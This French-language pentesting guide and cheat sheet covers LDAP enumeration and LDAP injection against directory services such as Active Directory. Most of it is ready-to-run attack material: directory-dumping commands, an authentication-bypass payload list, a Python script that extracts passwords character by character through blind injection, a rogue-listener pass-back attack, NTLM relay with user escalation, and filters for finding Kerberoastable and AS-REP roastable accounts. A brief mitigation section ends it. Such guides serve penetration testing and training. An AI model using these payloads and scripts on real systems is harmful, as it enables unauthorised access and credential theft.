# 📂 LDAP Injection & Enumeration - Guide Complet

Guide exhaustif pour l'énumération et l'exploitation des services LDAP.

---

## 📖 Concepts de Base

### Qu'est-ce que LDAP ?

**LDAP** (Lightweight Directory Access Protocol) est un protocole pour accéder et gérer des annuaires distribués (Active Directory, OpenLDAP, etc.).

```
Port 389  : LDAP (non chiffré)
Port 636  : LDAPS (SSL/TLS)
Port 3268 : Global Catalog
Port 3269 : Global Catalog SSL
```

### Structure LDAP

```
DC (Domain Component)    : dc=corp,dc=local
OU (Organizational Unit) : ou=Users,dc=corp,dc=local
CN (Common Name)         : cn=John Doe,ou=Users,dc=corp,dc=local
DN (Distinguished Name)  : Chemin complet d'un objet
```

### Attributs courants

```
cn              : Common Name
sn              : Surname
givenName       : First name
mail            : Email
userPassword    : Password (hash)
memberOf        : Group membership
userAccountControl : Account flags (AD)
sAMAccountName  : Login name (AD)
objectClass     : Type d'objet
```

---

## 1️⃣ Énumération LDAP

### Nmap

```bash
# Détection du service
nmap -p 389,636,3268,3269 -sV TARGET

# Scripts NSE
nmap -p 389 --script ldap-rootdse TARGET
nmap -p 389 --script ldap-search --script-args 'ldap.base="dc=corp,dc=local"' TARGET
nmap -p 389 --script ldap-brute TARGET
```

### ldapsearch (Anonymous Bind)

```bash
# Test anonymous bind
ldapsearch -x -H ldap://TARGET -b "" -s base "(objectClass=*)" "*" +

# Énumérer le base DN
ldapsearch -x -H ldap://TARGET -b "" -s base namingContexts

# Dump complet (si anonymous autorisé)
ldapsearch -x -H ldap://TARGET -b "dc=corp,dc=local" "(objectClass=*)"

# Énumérer les utilisateurs
ldapsearch -x -H ldap://TARGET -b "dc=corp,dc=local" "(objectClass=user)" cn sAMAccountName

# Énumérer les groupes
ldapsearch -x -H ldap://TARGET -b "dc=corp,dc=local" "(objectClass=group)" cn member

# Chercher les mots de passe
ldapsearch -x -H ldap://TARGET -b "dc=corp,dc=local" "(objectClass=*)" userPassword

# Utilisateurs avec description (souvent passwords dedans!)
ldapsearch -x -H ldap://TARGET -b "dc=corp,dc=local" "(description=*)" cn description
```

### ldapsearch (Authenticated)

```bash
# Avec credentials
ldapsearch -x -H ldap://TARGET -D "cn=admin,dc=corp,dc=local" -w 'password' -b "dc=corp,dc=local"

# Avec LDAPS
ldapsearch -x -H ldaps://TARGET -D "user@corp.local" -w 'password' -b "dc=corp,dc=local"

# Format UPN (Active Directory)
ldapsearch -x -H ldap://TARGET -D "user@corp.local" -w 'password' -b "dc=corp,dc=local"

# Énumérer les membres d'un groupe
ldapsearch -x -H ldap://TARGET -D "user@corp.local" -w 'pass' -b "dc=corp,dc=local" \
    "(&(objectClass=group)(cn=Domain Admins))" member
```

### ldapdomaindump

```bash
# Installation
pip install ldapdomaindump

# Dump complet du domaine
ldapdomaindump -u 'corp.local\user' -p 'password' TARGET

# Sortie : fichiers HTML et JSON avec users, groups, computers, etc.
# domain_users.html
# domain_groups.html
# domain_computers.html
# domain_policy.html
```

### windapsearch

```bash
# Installation
git clone https://github.com/ropnop/windapsearch
pip install python-ldap

# Énumérer les utilisateurs
python windapsearch.py -d corp.local -u user -p password --dc-ip TARGET -U

# Énumérer les groupes
python windapsearch.py -d corp.local -u user -p password --dc-ip TARGET -G

# Énumérer les ordinateurs
python windapsearch.py -d corp.local -u user -p password --dc-ip TARGET -C

# Énumérer les Domain Admins
python windapsearch.py -d corp.local -u user -p password --dc-ip TARGET --da

# Utilisateurs avec unconstrained delegation
python windapsearch.py -d corp.local -u user -p password --dc-ip TARGET --unconstrained-users

# Utilisateurs avec constrained delegation  
python windapsearch.py -d corp.local -u user -p password --dc-ip TARGET --constrained-users

# Recherche custom
python windapsearch.py -d corp.local -u user -p password --dc-ip TARGET \
    --custom "(&(objectClass=user)(adminCount=1))"
```

---

## 2️⃣ LDAP Injection

### Principe

L'injection LDAP survient quand l'input utilisateur est intégré dans une requête LDAP sans sanitization.

**Code vulnérable** :
```php
$filter = "(&(uid=" . $_GET['username'] . ")(userPassword=" . $_GET['password'] . "))";
$result = ldap_search($ldap, $base_dn, $filter);
```

### Syntaxe des filtres LDAP

```
(attribute=value)           Égalité
(attribute=*)               Présence (attribut existe)
(attribute>=value)          Supérieur ou égal
(attribute<=value)          Inférieur ou égal
(attribute=*value*)         Contient
(attribute=value*)          Commence par
(attribute=*value)          Termine par
(&(filter1)(filter2))       AND
(|(filter1)(filter2))       OR
(!(filter))                 NOT
```

### Authentication Bypass

```bash
# Requête originale
(&(uid=USER)(userPassword=PASS))

# Injection dans username
user=*
# Résultat: (&(uid=*)(userPassword=PASS))
# → Retourne tous les utilisateurs si password match

# Injection avec commentaire (si supporté)
user=admin)(|(uid=*
# Résultat: (&(uid=admin)(|(uid=*)(userPassword=PASS)))

# Injection classique - ignorer le password
user=admin)(&)
user=admin))%00
user=*))%00

# Bypass avec OR
user=*)(uid=*))(|(uid=*
# Résultat: (&(uid=*)(uid=*))(|(uid=*)(userPassword=PASS))
```

### Payloads d'injection

```bash
# Bypass authentication
*
*)(&
*))%00
admin)(&)
admin))%00
*)(uid=*))(|(uid=*
*)(|(uid=*
*)(|(password=*
admin)(|(password=*
*/*
*|
/
//
//*
*\x00
admin))(|(uid=*)
admin)))(|(uid=*)
```

### Extraction de données (Blind LDAP Injection)

```bash
# Extraire des attributs caractère par caractère
# Si le filtre est: (&(uid=USER)(password=PASS))

# Tester si password commence par 'a'
username=admin)(password=a*
# Si login OK → password commence par 'a'

# Tester le deuxième caractère
username=admin)(password=ab*
username=admin)(password=ac*
# etc.
```

**Script d'extraction** :
```python
#!/usr/bin/env python3
import requests
import string

url = "http://target.com/login"
charset = string.ascii_lowercase + string.digits

def test_char(known, char):
    payload = f"admin)(password={known}{char}*"
    data = {"username": payload, "password": "anything"}
    r = requests.post(url, data=data)
    return "Welcome" in r.text or "Success" in r.text

password = ""
while True:
    found = False
    for char in charset:
        if test_char(password, char):
            password += char
            print(f"[+] Password: {password}")
            found = True
            break
    if not found:
        break

print(f"[+] Final password: {password}")
```

### Énumération d'attributs via injection

```bash
# Tester si un attribut existe
user=admin)(description=*
user=admin)(telephoneNumber=*
user=admin)(mail=*

# Énumérer les valeurs
user=admin)(description=A*
user=admin)(description=B*
# etc.
```

---

## 3️⃣ Attaques LDAP Spécifiques

### LDAP Pass-back Attack

**Scénario** : Modifier la configuration LDAP d'un appareil (imprimante, etc.) pour capturer les credentials.

```bash
# 1. Configurer un serveur LDAP rogue
# Avec nc
nc -lvnp 389

# Ou avec un vrai serveur LDAP configuré pour logger
slapd -d 256  # Debug mode

# 2. Modifier la config de l'appareil pour pointer vers notre IP
# Via l'interface web de l'appareil

# 3. Déclencher une authentification LDAP
# L'appareil envoie ses credentials à notre serveur
```

### LDAP Relay

```bash
# Similaire à NTLM relay mais pour LDAP
# Utiliser avec Responder + ntlmrelayx

# Démarrer Responder
responder -I eth0

# Relay vers LDAP
ntlmrelayx.py -t ldap://DC_IP --escalate-user attacker
```

---

## 4️⃣ Filtres LDAP Utiles (Active Directory)

### Utilisateurs

```bash
# Tous les utilisateurs
(objectClass=user)
(objectCategory=person)

# Utilisateurs actifs
(&(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))

# Utilisateurs désactivés
(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=2))

# Utilisateurs avec password qui n'expire jamais
(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=65536))

# Utilisateurs sans pré-auth Kerberos (AS-REP Roastable)
(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

# Utilisateurs admin (adminCount=1)
(&(objectCategory=person)(adminCount=1))

# Utilisateurs avec SPN (Kerberoastable)
(&(objectCategory=person)(servicePrincipalName=*))

# Utilisateurs avec description
(&(objectCategory=person)(description=*))
```

### Groupes

```bash
# Tous les groupes
(objectClass=group)

# Domain Admins
(&(objectClass=group)(cn=Domain Admins))

# Groupes avec membres spécifiques
(&(objectClass=group)(member=cn=admin,ou=Users,dc=corp,dc=local))
```

### Ordinateurs

```bash
# Tous les ordinateurs
(objectClass=computer)

# Contrôleurs de domaine
(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))

# Ordinateurs avec unconstrained delegation
(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))

# Ordinateurs avec constrained delegation
(&(objectClass=computer)(msDS-AllowedToDelegateTo=*))
```

### Politiques et configurations

```bash
# Password policy
(objectClass=domainDNS)

# GPO
(objectClass=groupPolicyContainer)
```

---

## 5️⃣ Outils Avancés

### Python ldap3

```python
#!/usr/bin/env python3
from ldap3 import Server, Connection, ALL, SUBTREE

# Connexion
server = Server('ldap://TARGET', get_info=ALL)
conn = Connection(server, user='user@corp.local', password='password', auto_bind=True)

# Afficher les infos du serveur
print(server.info)

# Recherche
conn.search(
    search_base='dc=corp,dc=local',
    search_filter='(objectClass=user)',
    search_scope=SUBTREE,
    attributes=['cn', 'mail', 'memberOf']
)

for entry in conn.entries:
    print(entry)

# Recherche AS-REP Roastable
conn.search(
    search_base='dc=corp,dc=local',
    search_filter='(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))',
    attributes=['sAMAccountName']
)

for entry in conn.entries:
    print(f"AS-REP Roastable: {entry.sAMAccountName}")
```

### Impacket GetADUsers

```bash
# Énumérer les utilisateurs AD via LDAP
GetADUsers.py -all -dc-ip DC_IP corp.local/user:password

# Avec hashes
GetADUsers.py -all -dc-ip DC_IP -hashes :NTLM_HASH corp.local/user
```

### CrackMapExec LDAP

```bash
# Énumérer via LDAP
crackmapexec ldap DC_IP -u user -p password --users
crackmapexec ldap DC_IP -u user -p password --groups
crackmapexec ldap DC_IP -u user -p password --query "(adminCount=1)" ""
```

---

## 6️⃣ Protection et Mitigation

### Contre l'injection LDAP

```python
import re

def sanitize_ldap_input(input_string):
    """Échapper les caractères spéciaux LDAP"""
    escape_chars = {
        '\\': r'\5c',
        '*': r'\2a',
        '(': r'\28',
        ')': r'\29',
        '\x00': r'\00',
    }
    
    for char, escape in escape_chars.items():
        input_string = input_string.replace(char, escape)
    
    return input_string

# Utilisation
username = sanitize_ldap_input(user_input)
filter = f"(&(uid={username})(objectClass=user))"
```

### Désactiver anonymous bind

```ldif
# OpenLDAP - olcDisallows
dn: cn=config
changetype: modify
add: olcDisallows
olcDisallows: bind_anon
```

### Audit et monitoring

```bash
# Surveiller les requêtes LDAP suspectes
# - Requêtes avec wildcards excessifs
# - Requêtes sur des attributs sensibles
# - Nombreuses requêtes échouées
```

---

## 7️⃣ Cheatsheet Rapide

```bash
# Énumération
ldapsearch -x -H ldap://TARGET -b "" -s base namingContexts
ldapsearch -x -H ldap://TARGET -b "dc=corp,dc=local" "(objectClass=*)"
ldapdomaindump -u 'corp\user' -p 'pass' TARGET
windapsearch.py -d corp.local -u user -p pass --dc-ip TARGET -U

# Injection - Auth Bypass
*
*))%00
admin)(|(password=*
admin)(&)

# Injection - Extraction
username=admin)(password=a*
username=admin)(password=ab*

# Filtres AD utiles
# AS-REP Roastable
(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

# Kerberoastable (SPN)
(&(objectCategory=person)(servicePrincipalName=*))

# Admins
(&(objectCategory=person)(adminCount=1))

# Outils
ldapsearch, ldapdomaindump, windapsearch
crackmapexec ldap, GetADUsers.py
```

---

## 📚 Ressources

- **HackTricks LDAP** : https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
- **PayloadsAllTheThings LDAP** : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection
- **OWASP LDAP Injection** : https://owasp.org/www-community/attacks/LDAP_Injection
- **windapsearch** : https://github.com/ropnop/windapsearch

---

**Tags:** `#ldap #injection #enumeration #activedirectory #anonymous-bind #authentication-bypass`
